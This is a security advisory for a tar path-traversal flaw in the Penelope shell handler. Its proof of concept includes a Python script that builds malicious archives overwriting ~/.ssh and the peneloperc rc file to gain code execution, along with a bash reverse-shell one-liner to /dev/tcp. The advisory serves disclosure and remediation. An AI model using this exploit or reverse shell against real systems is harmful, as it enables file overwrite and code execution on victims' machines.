# [M] Penelope unsafe tar extraction allows arbitrary local file write via crafted session archive

## Summary
Severity: Medium
Advisory: GHSA-f42x-p2mx-hm8r
CVE: CVE-2026-50558
CWE: CWE-22
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:L (CVSS_V3)
Published: 2026-07-29
Source: https://github.com/advisories/GHSA-f42x-p2mx-hm8r
Type: github-advisory

## Affected
- PyPI: `penelope-shell-handler` — affected >=0 <0.20.0

## Details
### Summary

Penelope versions prior to 0.19.3 extracted tar archives received from remote sessions without validating archive member paths. When using the affected Unix download path, a malicious or compromised remote session could return a crafted tar archive containing path traversal entries, such as `../`, causing files to be written outside the intended download directory on the Penelope operator's machine.

The impact is limited to files writable by the user running Penelope. In some cases, this arbitrary file write could be chained to operator-side code execution if the attacker can overwrite a file that Penelope or the user later executes, such as `~/.penelope/peneloperc`. The issue has been fixed in version 0.19.3 by rejecting unsafe archive paths during extraction.

### Affected conditions

The issue requires the operator to use the Main Menu `download` command to download files from a malicious or compromised remote session that can influence the tar archive returned to Penelope. The Python agent download path is not affected in the same way because it does not rely on the remote `tar` command.

The vulnerable behavior is related to Python's historical `tarfile` extraction defaults. In Python versions before 3.14, `TarFile.extractall()` did not use the safer `data` extraction filter by default, so applications extracting untrusted tar archives needed to explicitly provide a safe extraction filter or perform their own path validation.

Python 3.14 changes the default extraction behavior to use the `data` filter, which rejects dangerous archive features such as absolute paths and paths outside the destination directory. Penelope 0.19.3 now performs explicit validation/rejection of unsafe archive paths so the fix does not depend on the Python runtime version.

### Details

The vulnerable code is in the Unix `download()` implementation.

Penelope creates a local download directory:

```python
local_download_folder = self.directory / "downloads"
```

Later, it opens a tar archive received from the remote session:

```python
tar = tarfile.open(mode=mode, fileobj=tar_source)
```

Then it extracts all members without validating archive paths:

```python
tar.extractall(local_download_folder)
```

Because member names are trusted, a malicious tar archive can contain paths such as:

```text
../../../../../home/operator/.penelope/peneloperc
```

This escapes the intended `local_download_folder` and writes to an arbitrary path writable by the Penelope operator.

The same extraction block also suppresses Python's `DeprecationWarning` around unsafe tar extraction:

```python
with warnings.catch_warnings():
    warnings.simplefilter("ignore", category=DeprecationWarning)
    tar.extractall(local_download_folder)
```

The file-write impact can be chained with Penelope's rc loading behavior:

```python
def load_rc():
    RC = Path(options.basedir / "peneloperc")
    try:
        with open(RC, "r") as rc:
            exec(rc.read(), globals())
```

By default, `options.basedir` is `~/.penelope`, so the executed rc file is:

```text
~/.penelope/peneloperc
```

Since session downloads are stored under `~/.penelope/sessions/<session>/downloads`, a crafted tar member can traverse upward and plant or replace `~/.penelope/peneloperc`. The planted Python code executes when Penelope starts again or when the operator runs `reload`.

### PoC

The following reproduces the issue locally by simulating a malicious remote endpoint. The fake `tar` binary is placed first in `PATH` for the test shell, so when Penelope asks the remote session to run `tar`, the remote session returns a crafted archive with path traversal entries.

Start Penelope in Terminal 1:

```bash
penelope -p 4444 -U -C #No upgrade and session connection needed
```
<img width="1920" height="337" alt="path1" src="https://github.com/user-attachments/assets/c8cb2dd6-e6d5-43ce-b3a2-61005dbcf95c" />

Prepare the fake remote `tar` in Terminal 2:

```bash
mkdir -p /tmp/penelope-fakebin
mkdir -p "$HOME/.penelope" "$HOME/.ssh"
cp -f "$HOME/.penelope/peneloperc" /tmp/peneloperc.backup 2>/dev/null || true

cat > /tmp/penelope-fakebin/tar <<'EOF'
#!/usr/bin/env python3
import io
import os
import sys
import tarfile
import time

home = os.path.expanduser("~")
target_home = home.lstrip("/")

def add_file(tar, target, data):
    data = data.encode()
    info = tarfile.TarInfo(target)
    info.size = len(data)
    info.mode = 0o644
    info.mtime = int(time.time())
    tar.addfile(info, io.BytesIO(data))

with tarfile.open(mode="w:gz", fileobj=sys.stdout.buffer) as tar:
    add_file(tar, "../../../../../" + target_home + "/PENELOPE_CVE_PROOF.txt", "Penelope path traversal proof\n")
    add_file(tar, "../../../../../" + target_home + "/.ssh/PENELOPE_SSH_KEY.txt", "fake-demo-ssh_key-not-for-authentication\n")
    add_file(
        tar,
        "../../../../../" + target_home + "/.penelope/peneloperc",
        "open('/" + target_home + "/PENELOPE_RC_EXECUTED.txt', 'w').write('peneloperc executed via reload\\n')\n"
    )
EOF

chmod +x /tmp/penelope-fakebin/tar
touch /tmp/penelope_dummy
```

Connect the local test shell back to Penelope in Terminal 2:

```bash
PATH=/tmp/penelope-fakebin:$PATH bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'
```
<img width="1920" height="1000" alt="path2" src="https://github.com/user-attachments/assets/c6db4888-9a41-4a99-b8d1-35c06f07ca4a" />

In Terminal 1, inside Penelope, trigger the vulnerable download:

```text
download /tmp/penelope_dummy
```

Verify in Terminal 3 that files were written outside the intended download directory:

```bash
cat "$HOME/PENELOPE_CVE_PROOF.txt"
cat "$HOME/.ssh/PENELOPE_SSH_KEY.txt"
grep PENELOPE_RC_EXECUTED "$HOME/.penelope/peneloperc"
```
<img width="1920" height="573" alt="path3" src="https://github.com/user-attachments/assets/9c7c8d3b-00ee-4d74-b195-1e91ff581243" />

Expected output includes:

```text
Penelope path traversal proof
fake-demo-ssh_key-not-for-authentication
open('/home/<user>/PENELOPE_RC_EXECUTED.txt', 'w').write('peneloperc executed via reload\n')
```

In Terminal 1, inside Penelope, execute the planted rc line:

```text
reload
```

Verify in Terminal 3 that `peneloperc` executed:

```bash
cat "$HOME/PENELOPE_RC_EXECUTED.txt"
```

Expected output:

```text
peneloperc executed via reload
```

Cleanup:

```bash
rm -f "$HOME/PENELOPE_CVE_PROOF.txt"
rm -f "$HOME/.ssh/PENELOPE_SSH_KEY.txt"
rm -f "$HOME/PENELOPE_RC_EXECUTED.txt"
if [ -f /tmp/peneloperc.backup ]; then cp -f /tmp/peneloperc.backup "$HOME/.penelope/peneloperc"; else rm -f "$HOME/.penelope/peneloperc"; fi
rm -f /tmp/peneloperc.backup
rm -rf /tmp/penelope-fakebin
rm -f /tmp/penelope_dummy
```

### Impact

A malicious remote session can write arbitrary files on the Penelope operator's machine, limited to the permissions of the user running Penelope.

For a non-root operator, this may be chained to operator-side code execution only if the attacker can overwrite a user-writable file that Penelope or the user later executes, such as:

```text
~/.penelope/peneloperc
~/.bashrc
~/.profile
~/.config/autostart/*.desktop
```

For a root operator, the impact is higher because root-writable files may be overwritten.

### Suggested Fix

Validate every archive member before extraction by resolving the final destination path and rejecting paths outside the intended download directory. Reject symlink and hardlink members. On supported Python versions, `filter="data"` can be used as an additional safeguard.

## References
- https://github.com/brightio/penelope/security/advisories/GHSA-f42x-p2mx-hm8r
- https://github.com/brightio/penelope/commit/a040afb5db32c7e80b5e8a2f9b2164cf911cfa62
- https://github.com/brightio/penelope
- https://github.com/brightio/penelope/releases/tag/v0.20.0
